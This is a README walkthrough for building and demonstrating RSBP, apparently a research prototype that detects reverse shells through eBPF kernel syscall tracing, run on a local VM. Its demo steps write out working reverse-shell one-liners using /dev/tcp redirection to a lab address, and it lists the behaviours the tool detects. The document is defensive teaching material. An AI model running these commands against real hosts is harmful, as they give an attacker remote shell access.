# RSBP — Install & Run from scratch (laptop/VM)

A complete, copy-pasteable walkthrough that takes a fresh Linux machine to a working RSBP
demo: build it, start it, trigger one controlled reverse shell, and watch it get caught in
a live dashboard. Everything is **offline and local** — no Internet-based attacker, no
external servers, no API keys.

> RSBP is a research/teaching prototype that detects reverse shells by their **behaviour at
> the kernel** (eBPF syscall telemetry + per-process correlation), not by their payload or
> destination.

---

## 0. You need a real Linux VM (not WSL2)

RSBP loads eBPF programs and attaches them to kernel **syscall tracepoints**. That needs a
kernel built with **BTF** and tracepoints — a standard Ubuntu kernel has both. The default
**WSL2** kernel is unreliable for this, so use a proper VM:

- **Ubuntu 24.04 LTS** (or 22.04), x86-64
- 2 vCPU, **4 GB RAM**, 20 GB disk (no GPU needed)
- VirtualBox, Hyper-V, VMware, or `multipass` all work

Confirm the kernel is suitable (inside the VM):

```bash
uname -r                      # expect 5.8 or newer
ls -l /sys/kernel/btf/vmlinux # must exist (BTF present)
```

If `/sys/kernel/btf/vmlinux` is missing, you're on a kernel without BTF — use a stock
Ubuntu cloud/desktop image instead.

---

## 1. Install system dependencies

```bash
sudo apt update
sudo apt install -y git build-essential clang libbpf-dev socat ncat curl
```

- `git` — to clone the code
- `clang` + `libbpf-dev` — only needed if you want to *regenerate* the eBPF object; the
  build itself doesn't need them (a prebuilt object is committed)
- `socat`, `ncat` — used as harmless local listeners in the demo
- `curl` — to query the local API/dashboard

### Install Go 1.23+ (the apt version is too old)

```bash
# pick the latest go1.23.x (or newer) for linux-amd64 from https://go.dev/dl/
cd /tmp
curl -LO https://go.dev/dl/go1.23.12.linux-amd64.tar.gz     # adjust to the current patch
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.12.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
go version                                                   # expect go1.23+ 
```

---

## 2. Get the code

```bash
git clone https://github.com/pavanthakor/RSBP.git
cd RSBP
git checkout demo-hardening      # the hardened, demo-ready branch
```

> If `demo-hardening` has been merged into `main` by the time you read this, skip the
> `checkout` and just use `main`.

---

## 3. Build (Go only — ~1 minute)

```bash
make build
```

This compiles `bin/rsbpd`. No clang/eBPF toolchain is required here because the compiled
eBPF object ships in the repo. (To rebuild the eBPF program after editing `bpf/rsbp.bpf.c`,
run `make generate`, which needs `clang` + `libbpf-dev`.)

---

## 4. Prepare the machine (one time per boot)

```bash
sudo bash scripts/setup-demo.sh bin/rsbpd
```

This mounts `tracefs` (so tracepoints are reachable), creates `/var/log/rsbp` and
`/var/lib/rsbp`, confirms BTF, and grants the binary the `CAP_BPF` / `CAP_SYS_ADMIN`
capabilities it needs. You should see `tracepoints: OK`, `dirs: … OK`, `BTF: OK`,
`caps set on bin/rsbpd`.

---

## 5. Run the deterministic demo

```bash
sudo ./demo/reverse_shell_demo.sh
```

You'll see four stages:

1. **PREPARE** — RSBP starts, `eBPF tracepoints attached: 11/11`.
2. **BASELINE** — ordinary activity (`wget`, `ssh`, a python client, `git`) →
   **`alerts raised: 0`**. This is the point: normal outbound traffic is *not* an alert.
3. **SIMULATE** — one controlled `bash -i >& /dev/tcp/203.0.113.10/4444` against a passive
   local listener on a lab address.
4. **DETECT** — the single alert, e.g.:
   ```
   Critical  score=1   DirectDup2Shell   exe=bash   chain=execve socket connect dup2 -> 203.0.113.10:4444
   ```

Run just one stage with `… reverse_shell_demo.sh baseline` or `… attack`.

---

## 6. Watch it live in the dashboard

In one terminal, run the daemon:

```bash
sudo ./bin/rsbpd run --config config/demo.yaml
```

Open a browser **on the VM** at:

```
http://127.0.0.1:9001/
```

You'll get a live panel: probes attached, kernel events/sec, sessions, detections, and a
table of recent alerts (severity, behavioural pattern, syscall chain, process, remote,
score). Then, in a **second terminal**, trigger a reverse shell to see a row appear:

```bash
# passive local listener
ncat -lk 203.0.113.10 4444 &
# controlled reverse shell (duplicates the socket onto stdio, then runs a command)
timeout 4 bash -c 'exec 3<>/dev/tcp/203.0.113.10/4444; exec 0<&3 1>&3 2>&3; id; sleep 2'
```

(If `203.0.113.10` isn't on your loopback yet: `sudo ip addr add 203.0.113.10/32 dev lo`.)

Stop the daemon with `sudo pkill -f "rsbpd run"`.

---

## 7. What you're actually seeing (for the write-up)

- **11 tracepoints** stream `execve`, `socket`, `connect`, `dup2`/`dup3`, `fork`/`clone3`,
  `pipe`/`pipe2` events through a BPF ring buffer into the Go daemon.
- Events are **correlated per process** (keyed by PID + process start-time).
- An alert fires only on a **reverse-shell behaviour** — a socket duplicated onto a shell's
  stdin/stdout/stderr, a `/dev/tcp` redirection, a `fork`+`pipe` relay, or a netcat/socat
  tool connecting out. A plain connection to an external IP is **not** enough. That's the
  behavioural-profiling idea.

---

## 8. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `probes_attached: 0/11` or attach error | Kernel lacks BTF or you're on WSL2 → use a stock Ubuntu VM; make sure you ran step 4 and are using `sudo`. |
| `tracepoints path unavailable` | `tracefs` not mounted → `sudo mount -t tracefs none /sys/kernel/tracing` (step 4 does this). |
| `go: build … requires go >= 1.23` | The distro Go is too old → install Go from go.dev (step 1). |
| Dashboard page is blank / won't load | Is the daemon running? Is it on `127.0.0.1:9001`? Open the URL **inside** the VM. |
| Demo attack shows no alert | The listener must be up and the target must be a **non-loopback** lab IP (the script uses `203.0.113.10`). |
| `make build` wants clang | You're on an old Makefile — on `demo-hardening`, `make build` is Go-only. |

---

## 9. Clean up

```bash
sudo pkill -f "rsbpd run"            # stop the daemon
sudo rm -rf /var/log/rsbp /var/lib/rsbp   # optional: remove runtime data
```

That's it — a full reverse-shell detector, built and demonstrated end to end on one VM.
